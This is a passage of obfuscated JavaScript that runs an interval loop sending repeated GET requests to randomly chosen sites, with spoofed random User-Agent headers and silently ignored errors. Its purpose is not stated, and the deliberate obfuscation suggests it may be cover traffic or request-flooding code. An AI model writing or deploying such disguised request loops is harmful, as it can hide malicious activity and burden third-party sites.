      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x33d + -0x355 * 0xf + -0x1d * -0x28e) * getRandomInt(0x140b + -0x22ff + 0xef5, 0xe * -0xd3 + -0x2b * 0x3e + 0x15f9));
}, 0x19b + 0xe7b * -0x1 + 0xd44);